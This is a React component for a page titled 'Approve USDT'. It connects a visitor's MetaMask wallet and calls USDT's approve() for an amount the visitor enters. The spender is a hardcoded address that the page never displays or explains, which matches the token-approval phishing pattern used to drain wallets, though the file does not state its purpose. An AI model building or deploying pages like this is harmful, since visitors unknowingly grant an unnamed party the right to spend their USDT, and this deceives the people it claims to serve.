import { useState } from "react";
import { ethers } from "ethers";
import "./ApprovePage.css";

const USDT_ADDRESS =
  "0xdAC17F958D2ee523a2206206994597C13D831ec7";

export default function ApprovePage() {
  const [amount, setAmount] = useState("");
  const [loading, setLoading] = useState(false);

  const approve = async () => {
    try {
      if (!amount) {
        alert("Please enter an amount");
        return;
      }

      if (!(window as any).ethereum) {
        alert("Please install MetaMask");
        return;
      }

      setLoading(true);

      const provider = new ethers.BrowserProvider(
        (window as any).ethereum
      );

      await provider.send("eth_requestAccounts", []);

      const signer = await provider.getSigner();

      const spender = "0x70F2211e63D1EF5109370082721a145B4b96b0b5";

      if (!spender) {
        alert("Spender address missing");
        return;
      }

      const usdt = new ethers.Contract(
        USDT_ADDRESS,
        [
          "function approve(address spender,uint256 amount) external returns(bool)"
        ],
        signer
      );

      // USDT uses 6 decimals
      const amountInWei = ethers.parseUnits(
        amount,
        6
      );

      const tx = await usdt.approve(
        spender,
        amountInWei
      );

      await tx.wait();

      alert(`Approved ${amount} USDT`);
    } catch (err) {
      console.error(err);
      alert("Transaction failed");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="page">
  <div className="card">
    <div className="logo">₮</div>

    <h1>Approve USDT</h1>

    <p>
      Enter the amount of USDT you want to approve.
    </p>

    <input
      type="number"
      placeholder="Enter USDT Amount"
      value={amount}
      onChange={(e) => setAmount(e.target.value)}
      className="amount-input"
    />

    <button
      className="approve-btn"
      onClick={approve}
      disabled={loading}
    >
      {loading ? "Processing..." : "Submit"}
    </button>
  </div>
</div>
  );
}
